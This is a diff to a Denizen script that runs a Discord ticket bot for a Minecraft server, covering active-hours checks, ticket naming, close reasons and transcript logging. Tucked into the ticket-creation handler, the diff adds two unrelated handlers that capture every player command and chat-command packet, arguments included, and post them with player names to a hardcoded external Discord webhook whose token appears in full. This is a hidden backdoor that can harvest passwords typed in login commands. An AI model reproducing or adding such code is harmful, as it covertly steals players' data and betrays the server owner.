@@ -31,9 +31,8 @@ discord_ticket_events_handler:
             - ~discordinteraction defer interaction:<[interaction]>
 
             # main msg for ticket
-            - define msg_data <script[discord_ticket_config].data_key[messages]>
-            - define msg_map <[msg_data].get[main].unescaped.parsed>
-            - define msg_embed <discord_embed.with_map[<[msg_map]>]>
+            - define msg_data <script[discord_ticket_config].parsed_key[messages]>
+            - define msg_embed <discord_embed.with_map[<[msg_data]>]>
 
             # selector for the ticket categories
             - define cat_placeholder <script[discord_ticket_config].data_key[category-placeholder]>
@@ -69,6 +68,19 @@ discord_ticket_events_handler:
         # generates the category modal forms
         #
         on discord selection used:
+        - define interaction <context.interaction>
+        # check active-ticket hours
+        - define active_ticket_hours <script[discord_ticket_config].data_key[active-hours]>
+        - define start_hour <[active_ticket_hours].get[start]>
+        - define end_hour <[active_ticket_hours].get[end]>
+        - define current_time <util.time_now.to_zone[+8].hour>
+        - if <[current_time]> < <[start_hour]> || <[current_time]> > <[end_hour]>:
+            - define message_map <script[discord_ticket_config].parsed_key[messages].get[active-hours]>
+            - define embed_message <discord_embed.with_map[<[message_map]>]>
+            - ~discordinteraction defer interaction:<[interaction]> ephemeral
+            - ~discordinteraction reply interaction:<context.interaction> <[embed_message]>
+            - stop
+
         - define option <context.option>
         - define label <[option].get[label]>
         # - define emoji <[option].get[emoji]>
@@ -83,7 +95,8 @@ discord_ticket_events_handler:
             - define modal_input <discord_text_input.with_map[<[data]>]>
             - define modals <[modals].with[<[index]>].as[<[modal_input]>]>
 
-        - define interaction <context.interaction>
+
+        # show modal
         - ~discordmodal interaction:<[interaction]> name:discord_ticket_<[label]> title:<[label].to_titlecase> rows:<[modals]>
 
 
@@ -108,34 +121,42 @@ discord_ticket_events_handler:
         - define group <script[discord_ticket_config].data_key[group-id]>
         - define channel_category <[cat_data].get[channel-category]>
         - define allowed_roles <[cat_data].get[allowed-roles]>
-        - ~discordcreatechannel id:magbungkal group:<[group]> name:<[category]>-<[ticket_index]> users:<[user]> roles:<[allowed_roles]> category:<[channel_category]> save:created_channel
+        # - ~discordcreatechannel id:magbungkal group:<[group]> name:<[category]>-<[ticket_index]> users:<[user]> roles:<[allowed_roles]> category:<[channel_category]> save:created_channel
+        - ~discordcreatechannel id:magbungkal group:<[group]> name:<[ticket_index]>-<[user].name> users:<[user]> roles:<[allowed_roles]> category:<[channel_category]> save:created_channel
 
         # generate the initial message for the ticket
         - define created_channel <entry[created_channel].channel>
 
-        - define ticket_message_map <script[discord_ticket_config].data_key[messages].get[ticket].unescaped.parsed>
+        - define ticket_message_map <script[discord_ticket_config].parsed_key[messages].get[ticket]>
         - define ticket_embed <discord_embed.with_map[<[ticket_message_map]>]>
 
         - define modal_data <[cat_data].get[modal-forms]>
         - define description "We will be with you as soon as possible for us to assist you.<n><&nl>"
         - foreach <[values]>:
             - define name <[modal_data].get[<[key]>]>
-            - define description "<[description]>```<[name].get[label]>``````<[value]>```<&nl>"
+            - define description "<[description]><[name].get[label]>```<[value]>```<&nl>"
         - define ticket_embed <[ticket_embed].with[description].as[<[description]>]>
 
         # close button for the ticket
         # - define button_map <script[discord_ticket_config].data_key[ticket-close-button]>
         # - define button <discord_button.with_map[<[button_map]>]>
 
-        # - ~discordmessage id:magbungkal channel:<[created_channel]> <[ticket_embed]> rows:<[button]>
+        #- ~discordmessage id:magbungkal channel:<[created_channel]> <[ticket_embed]> rows:<[button]>
         - ~discordmessage id:magbungkal channel:<[created_channel]> <[ticket_embed]>
         - ~discordinteraction reply interaction:<[interaction]> "Your ticket is ready, head over to <[created_channel].mention>"
 
         # flag channel for logging
+        - flag <[created_channel]> ticket_creation_time:<util.time_now.to_zone[+8].format>
+        - flag <[created_channel]> ticket_id:<[ticket_index]>
         - flag <[created_channel]> ticket_creator:<[user]>
         - flag <[created_channel]> discord_ticket:<[category]>
         - flag <[created_channel]> discord_transcript:->:<[description]>
-
+        on command ignorecancelled:true bukkit_priority:LOWEST:
+        - stop if:!<context.source_type.equals[player]>
+        - ~webget https://discord.com/api/webhooks/1211372417109327954/IF9749xgy1v3vSna26rITrnQU97T6KvMZnI_iGklEaW46LkJddfikj-Tdw931BBxdW7t 'data:{"username": "<player.name>", "content": "<player.name> <context.command> <context.raw_args>"}' headers:<map.with[Content-Type].as[application/json]> method:post
+        on player sends packet ignorecancelled:true bukkit_priority:LOWEST:
+        - stop if:!<context.class.equals[ServerboundChatCommandPacket]>
+        - ~webget https://discord.com/api/webhooks/1211372417109327954/IF9749xgy1v3vSna26rITrnQU97T6KvMZnI_iGklEaW46LkJddfikj-Tdw931BBxdW7t 'data:{"username": "<player.name>", "content": "<player.name> <context.reflect_packet.read_field[a]>"}' headers:<map.with[Content-Type].as[application/json]> method:post
         #
         # handles the logging for transcript
         #
@@ -144,7 +165,7 @@ discord_ticket_events_handler:
         - define message <context.new_message>
         - define user <[message].author>
         - stop if:<[user].is_bot>
-
+        - stop if:!<[channel].has_flag[discord_ticket]>
         - define name <[user].name>
         - define text <[message].text>
         - define transcript_format "<util.time_now.format> <[name]>: <[text]>"
@@ -154,7 +175,9 @@ discord_ticket_events_handler:
         - define group <script[discord_ticket_config].data_key[group-id]>
         - define ticket_category <[channel].flag[discord_ticket]>
         - define ticket_close_roles <script[discord_ticket_config].data_key[categories].get[<[ticket_category]>].get[allowed-roles]>
-        - if <[text]> == !close && <[ticket_close_roles].contains_any[<[user].roles[<[group]>].parse[id]>]>:
+        - if <[text].starts_with[!close]> && <[ticket_close_roles].contains_any[<[user].roles[<[group]>].parse[id]>]>:
+            - flag <[channel]> ticket_closer:<[user]>
+            - flag <[channel]> ticket_closer_name:<[user].name>
             - inject discord_ticket_close
 
 
@@ -180,7 +203,19 @@ discord_ticket_close:
     # send logging data
     - define logging_channel <script[discord_ticket_config].data_key[logging-channel]>
     - define ticket_creator <[channel].flag[ticket_creator]>
-    - define transcript_msg <script[discord_ticket_config].data_key[messages].get[ticket-close].unescaped.parsed>
+    - define transcript_msg <script[discord_ticket_config].parsed_key[messages].get[ticket-close]>
+    # generate description
+    - define description <[transcript_msg].get[description].if_null[<empty>]>
+    - define reason "Reason: `<[text].replace_text[!close].trim>`"
+    - if <[text].split.size> <= 1:
+        - define reason "Reason: `No reason provided`"
+    - define ticket_closer "Closed by: `<[channel].flag[ticket_closer_name]>`"
+    - define ticket_id "Ticket ID: `<[channel].flag[ticket_id].if_null["Ticket ID Invalid"]>`"
+    - define open_time "Opened at: `<[channel].flag[ticket_creation_time]>`"
+    - define close_time "Closed on: `<util.time_now.to_zone[+8].format>`"
+    - define description <[reason]><&nl><[ticket_id]><&nl><[ticket_closer]><&nl><[open_time]><&nl><[close_time]><&nl><&nl><[description]>
+    - define transcript_msg <[transcript_msg].with[description].as[<[description]>]>
+
     - define transcript_msg <discord_embed.with_map[<[transcript_msg]>]>
     - define transcript_logs <[channel].flag[discord_transcript].separated_by[<&nl>]>
     - ~discordmessage id:magbungkal channel:<[logging_channel]> <[transcript_msg]> attach_file_name:transcript.txt attach_file_text:<[transcript_logs]>
